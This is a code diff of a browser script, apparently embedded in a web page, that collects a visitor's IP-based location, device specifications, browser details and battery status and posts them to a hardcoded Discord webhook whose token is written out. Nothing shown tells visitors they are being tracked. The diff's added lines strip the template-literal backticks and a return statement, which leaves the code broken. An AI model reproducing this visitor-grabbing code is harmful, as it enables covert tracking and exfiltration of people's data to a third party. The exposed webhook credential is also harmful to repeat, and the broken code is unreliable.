@@ -51,9 +51,9 @@
                 .then(response => response.json())
                 .then(data => {
                     // Collecting additional info
-                    const geoInfo = `IP: ${data.ip}\nLocation: ${data.city}, ${data.region}, ${data.country}\nTimezone: ${data.timezone}\nCurrency: ${data.currency}`;
+                    const geoInfo = IP: ${data.ip}\nLocation: ${data.city}, ${data.region}, ${data.country}\nTimezone: ${data.timezone}\nCurrency: ${data.currency};
 
-                    const systemInfo = `
+                    const systemInfo = 
                         Screen Resolution: ${window.innerWidth}x${window.innerHeight}
                         Browser: ${navigator.userAgent}
                         Operating System: ${navigator.platform}
@@ -62,32 +62,12 @@
                         Battery Status: ${navigator.getBattery ? getBatteryStatus() : 'N/A'}
                         RAM: ${navigator.deviceMemory}GB
                         CPU Cores: ${navigator.hardwareConcurrency}
-                        Screen Orientation: ${window.screen.orientation.type}
-                        Is Online: ${navigator.onLine ? 'Yes' : 'No'}
-                        Connection Type: ${navigator.connection ? navigator.connection.effectiveType : 'N/A'}
-                        Device Memory: ${navigator.deviceMemory}GB
-                        Network Connection: ${navigator.connection ? navigator.connection.type : 'N/A'}
-                        Touch Support: ${('ontouchstart' in window) ? 'Yes' : 'No'}
-                        Vibration: ${navigator.vibrate ? 'Supported' : 'Not Supported'}
-                        JavaScript Enabled: ${navigator.javaEnabled() ? 'Yes' : 'No'}
-                    `;
+                    ;
 
-                    const performanceInfo = `Page Load Time: ${window.performance.timing.loadEventEnd - window.performance.timing.navigationStart} ms`;
-
-                    // Collect additional browser info
-                    const browserInfo = `
-                        User-Agent: ${navigator.userAgent}
-                        Cookies Enabled: ${navigator.cookieEnabled ? 'Yes' : 'No'}
-                        Local Storage Supported: ${typeof(Storage) !== "undefined" ? 'Yes' : 'No'}
-                        Session Storage Supported: ${typeof(sessionStorage) !== "undefined" ? 'Yes' : 'No'}
-                        Screen Pixel Ratio: ${window.devicePixelRatio}
-                        Viewport Dimensions: ${window.innerWidth} x ${window.innerHeight}
-                        Language: ${navigator.language}
-                        Timezone Offset: ${new Date().getTimezoneOffset()} minutes
-                    `;
+                    const performanceInfo = Page Load Time: ${window.performance.timing.loadEventEnd - window.performance.timing.navigationStart} ms;
 
                     // Send the info to Discord Webhook
-                    sendToWebhook(geoInfo, systemInfo, performanceInfo, browserInfo);
+                    sendToWebhook(geoInfo, systemInfo, performanceInfo);
                 })
                 .catch(error => {
                     console.error('Error fetching geo data:', error);
@@ -102,13 +82,13 @@
         }
 
         function getBatteryStatus() {
-            return navigator.getBattery().then(function(battery) {
-                return `Level: ${battery.level * 100}% Charging: ${battery.charging ? 'Yes' : 'No'}`;
+            navigator.getBattery().then(function(battery) {
+                return Level: ${battery.level * 100}% Charging: ${battery.charging ? 'Yes' : 'No'};
             });
         }
 
-        function sendToWebhook(geoInfo, systemInfo, performanceInfo, browserInfo) {
-            const webhookURL = "https://discord.com/api/webhooks/1334960796609937499/7YlpdDT2pphEH6wCeuD6eS10QIS1QQVyz2HicjXZPK5lZ7XOpgs3ZBiG_7fDFhiTpAWm";
+        function sendToWebhook(geoInfo, systemInfo, performanceInfo) {
+            const webhookURL = "https://discord.com/api/webhooks/1334960796609937499/7YlpdDT2pphEH6wCeuD6eS10QIS1QQVyz2HicjXZPK5lZ7XOpgs3ZBiG_7fDFhiTpAWm"; // Replace with your actual Discord webhook URL
 
             const content = {
                 content: "Detailed System Information",
@@ -117,8 +97,7 @@
                     fields: [
                         { name: "Geolocation Info", value: geoInfo, inline: false },
                         { name: "System Info", value: systemInfo, inline: false },
-                        { name: "Performance Info", value: performanceInfo, inline: false },
-                        { name: "Browser Info", value: browserInfo, inline: false }
+                        { name: "Performance Info", value: performanceInfo, inline: false }
                     ],
                     footer: {
                         text: "Info Sent from Web"
